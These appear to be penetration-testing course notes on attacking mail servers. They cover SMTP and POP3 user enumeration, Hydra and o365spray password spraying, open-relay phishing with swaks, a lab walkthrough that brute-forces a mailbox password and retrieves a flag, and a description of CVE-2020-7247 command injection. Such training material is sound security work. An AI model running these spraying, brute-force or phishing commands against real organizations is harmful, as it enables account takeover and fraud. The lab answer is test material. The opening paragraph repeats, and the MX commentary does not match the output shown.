A `mail server` (sometimes also referred to as an email server) is a server that handles and delivers email over a network, usually over the Internet. A mail server can receive emails from a client device and send them to other mail servers. A mail server can also deliver emails to a client device. A client is usually the device where we read our emails (computers, smartphones, etc.).

A `mail server` (sometimes also referred to as an email server) is a server that handles and delivers email over a network, usually over the Internet. A mail server can receive emails from a client device and send them to other mail servers. A mail server can also deliver emails to a client device. A client is usually the device where we read our emails (computers, smartphones, etc.).

When we download emails to our email application, it will connect to a `POP3` or `IMAP4` server on the Internet, which allows the user to save messages in a server mailbox and download them periodically.

## Enumeration
We can use the `Mail eXchanger` (`MX`) DNS record to identify a mail server. The MX record specifies the mail server responsible for accepting email messages on behalf of a domain name. It is possible to configure several MX records, typically pointing to an array of mail servers for load balancing and redundancy.

We can use tools such as `host` or `dig` and online websites such as [MXToolbox](https://mxtoolbox.com/) to query information about the MX records:

#### Host - MX Records
```shell
> host -t MX hackthebox.eu

hackthebox.eu mail is handled by 1 aspmx.l.google.com.
```

#### DIG - MX Records
```shell
> dig mx plaintext.do | grep "MX" | grep -v ";"

plaintext.do.           7076    IN      MX      50 mx3.zoho.com.
plaintext.do.           7076    IN      MX      10 mx.zoho.com.
plaintext.do.           7076    IN      MX      20 mx2.zoho.com.
```

#### Host - A Records
```shell
> host -t A mail1.inlanefreight.htb.

mail1.inlanefreight.htb has address 10.129.14.128
```

These `MX` records indicate that the first three mail services are using a cloud services G-Suite (aspmx.l.google.com), Microsoft 365 (microsoft-com.mail.protection.outlook.com), and Zoho (mx.zoho.com), and the last one may be a custom mail server hosted by the company.

This information is essential because the enumeration methods may differ from one service to another.

If we are targetting a custom mail server implementation such as `inlanefreight.htb`, we can enumerate the following ports:

|**Port**|**Service**|
|---|---|
|`TCP/25`|SMTP Unencrypted|
|`TCP/143`|IMAP4 Unencrypted|
|`TCP/110`|POP3 Unencrypted|
|`TCP/465`|SMTP Encrypted|
|`TCP/587`|SMTP Encrypted/[STARTTLS](https://en.wikipedia.org/wiki/Opportunistic_TLS)|
|`TCP/993`|IMAP4 Encrypted|
|`TCP/995`|POP3 Encrypted|
We can use `Nmap`'s default script `-sC` option to enumerate those ports on the target system:

```shell
> sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.14.128

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-27 17:56 CEST
Nmap scan report for 10.129.14.128
Host is up (0.00025s latency).

PORT   STATE SERVICE VERSION
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: mail1.inlanefreight.htb, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 
MAC Address: 00:00:00:00:00:00 (VMware)
```

## Misconfigurations
Email services use authentication to allow users to send emails and receive emails. A misconfiguration can happen when the SMTP service allows anonymous authentication or support protocols that can be used to enumerate valid usernames.

#### Authentication
The SMTP server has different commands that can be used to enumerate valid usernames `VRFY`, `EXPN`, and `RCPT TO`. If we successfully enumerate valid usernames, we can attempt to password spray, brute-forcing, or guess a valid password. So let's explore how those commands work.

`VRFY` this command instructs the receiving SMTP server to check the validity of a particular email username. The server will respond, indicating if the user exists or not. This feature can be disabled.

#### VRFY Command
```shell
> telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)


VRFY root

252 2.0.0 root


VRFY www-data

252 2.0.0 www-data


VRFY new-user

550 5.1.1 <new-user>: Recipient address rejected: User unknown in local recipient table
```

`EXPN` is similar to `VRFY`, except that when used with a distribution list, it will list all users on that list. This can be a bigger problem than the `VRFY` command since sites often have an alias such as "all."

#### EXPN Command
```shell
> telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)


EXPN john

250 2.1.0 john@inlanefreight.htb


EXPN support-team

250 2.0.0 carol@inlanefreight.htb
250 2.1.5 elisa@inlanefreight.htb
```

`RCPT TO` identifies the recipient of the email message. This command can be repeated multiple times for a given message to deliver a single message to multiple recipients.
#### RCPT TO Command
```shell-session
telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)


MAIL FROM:test@htb.com
it is
250 2.1.0 test@htb.com... Sender ok


RCPT TO:julio

550 5.1.1 julio... User unknown


RCPT TO:kate

550 5.1.1 kate... User unknown


RCPT TO:john

250 2.1.5 john... Recipient ok
```

We can also use the `POP3` protocol to enumerate users depending on the service implementation. For example, we can use the command `USER` followed by the username, and if the server responds `OK`. This means that the user exists on the server.

#### USER Command
```shell
> telnet 10.10.110.20 110

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
+OK POP3 Server ready

USER julio

-ERR


USER john

+OK
```

To automate our enumeration process, we can use a tool named [smtp-user-enum](https://github.com/pentestmonkey/smtp-user-enum). We can specify the enumeration mode with the argument `-M` followed by `VRFY`, `EXPN`, or `RCPT`, and the argument `-U` with a file containing the list of users we want to enumerate. Depending on the server implementation and enumeration mode, we need to add the domain for the email address with the argument `-D`. Finally, we specify the target with the argument `-t`.

```shell
smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
```

## Cloud Enumeration
As discussed, cloud service providers use their own implementation for email services. Those services commonly have custom features that we can abuse for operation, such as username enumeration. Let's use Office 365 as an example and explore how we can enumerate usernames in this cloud platform.
[O365spray](https://github.com/0xZDH/o365spray) is a username enumeration and password spraying tool aimed at Microsoft Office 365 (O365) developed by [ZDH](https://twitter.com/0xzdh).

#### O365 Spray
```shell
 > python3 o365spray.py --validate --domain msplaintext.xyz

            *** O365 Spray ***            

>----------------------------------------<

   > version        :  2.0.4
   > domain         :  msplaintext.xyz
   > validate       :  True
   > timeout        :  25 seconds
   > start          :  2022-04-13 09:46:40

>----------------------------------------<
```
Now, we can attempt to identify usernames.

```shell
> python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz        
                                       
            *** O365 Spray ***             

>----------------------------------------<

   > version        :  2.0.4
   > domain         :  msplaintext.xyz
   > enum           :  True
   > userfile       :  users.txt
   > enum_module    :  office
   > rate           :  10 threads
   > timeout        :  25 seconds
   > start          :  2022-04-13 09:48:03

>----------------------------------------<

[2022-04-13 09:48:03,621] INFO : Running O365 validation for: msplaintext.xyz
[2022-04-13 09:48:04,062] INFO : [VALID] The following domain is using O365: msplaintext.xyz
[2022-04-13 09:48:04,064] INFO : Running user enumeration against 67 potential users
[2022-04-13 09:48:08,244] INFO : [VALID] lewen@msplaintext.xyz
[2022-04-13 09:48:10,415] INFO : [VALID] juurena@msplaintext.xyz
[2022-04-13 09:48:10,415] INFO : 

[ * ] Valid accounts can be found at: '/opt/o365spray/enum/enum_valid_accounts.2204130948.txt'
[ * ] All enumerated accounts can be found at: '/opt/o365spray/enum/enum_tested_accounts.2204130948.txt'

[2022-04-13 09:48:10,416] INFO : Valid Accounts: 2
```

## Password Attacks
We can use `Hydra` to perform a password spray or brute force against email services such as `SMTP`, `POP3`, or `IMAP4`. First, we need to get a username list and a password list and specify which service we want to attack. Let us see an example for `POP3`.

#### Hydra - Password Attack
```shell
hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
```

If cloud services support SMTP, POP3, or IMAP4 protocols, we may be able to attempt to perform password spray using tools like `Hydra`, but these tools are usually blocked. We can instead try to use custom tools such as [o365spray](https://github.com/0xZDH/o365spray) or [MailSniper](https://github.com/dafthack/MailSniper) for Microsoft Office 365 or [CredKing](https://github.com/ustayready/CredKing) for Gmail or Okta.

#### O365 Spray - Password Spraying
```shell
python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
```

## Protocol Specifics Attacks
An open relay is a Simple Mail Transfer Protocol (`SMTP`) server, which is improperly configured and allows an unauthenticated email relay. Messaging servers that are accidentally or intentionally configured as open relays allow mail from any source to be transparently re-routed through the open relay server. This behavior masks the source of the messages and makes it look like the mail originated from the open relay server.

#### Open Relay
From an attacker's standpoint, we can abuse this for phishing by sending emails as non-existing users or spoofing someone else's email. For example, imagine we are targeting an enterprise with an open relay mail server, and we identify they use a specific email address to send notifications to their employees. We can send a similar email using the same address and add our phishing link with this information. With the `nmap smtp-open-relay` script, we can identify if an SMTP port allows an open relay.

```shell
nmap -p25 -Pn --script smtp-open-relay 10.10.11.213
```

Next, we can use any mail client to connect to the mail server and send our email.

```shell
swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213
```

## Questions

1. What is the available username for the domain inlanefreight.htb in the SMTP server?
```shell
> smtp-user-enum -m RCPT -U users.list -d inlanefreight.htb 10.129.109.123 25
[SUCC] marlin        250 OK
```

2. Access the email account using the user credentials that you discovered and submit the flag in the email as your answer.
```shell
Brute force password
> hydra -l 'marlin@inlanefreight.htb' -P pws.list -f 10.129.109.123 pop3 -V -I

login: marlin@inlanefreight.htb   password: poohbear

> telnet 10.129.109.123 110
USER marlin@inlanefreight.htb
PASS poohbear
LIST
	+OK 1 messages (601 octets)
	1 601
RETR 1

	flag: HTB{w34k_p4$$w0rd}
```

---

# Latest Email Service Vulnerabilities

One of the most recent publicly disclosed and dangerous [Simple Mail Transfer Protocol (SMTP)](https://en.wikipedia.org/wiki/Simple_Mail_Transfer_Protocol) vulnerabilities was discovered in [OpenSMTPD](https://www.opensmtpd.org/) up to version 6.6.2 service was in 2020. This vulnerability was assigned [CVE-2020-7247](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7247) and leads to RCE. It has been exploitable since 2018. This service has been used in many different Linux distributions, such as Debian, Fedora, FreeBSD, and others. The dangerous thing about this vulnerability is the possibility of executing system commands remotely on the system and that exploiting this vulnerability does not require authentication.

According to [Shodan.io](https://www.shodan.io/), at the time of writing (April 2022), there are over 5,000 publicly accessible OpenSMTPD servers worldwide, and the trend is growing. However, this does not mean that this vulnerability affects every service. Instead, we want to show you how significant the impact of an RCE would be in case this vulnerability were discovered now. However, of course, this applies to all other services as well.

#### Shodan Search
![[Pasted image 20251021190939.png]]

#### Shodan Trend
![[Pasted image 20251021190948.png]]

## The Concept of the Attack
As we already know, with the SMTP service, we can compose emails and send them to desired people. The vulnerability in this service lies in the program's code, namely in the function that records the sender's email address. This offers the possibility of escaping the function using a semicolon (`;`) and making the system execute arbitrary shell commands. However, there is a limit of 64 characters, which can be inserted as a command. The technical details of this vulnerability can be found [here](https://www.openwall.com/lists/oss-security/2020/01/28/3).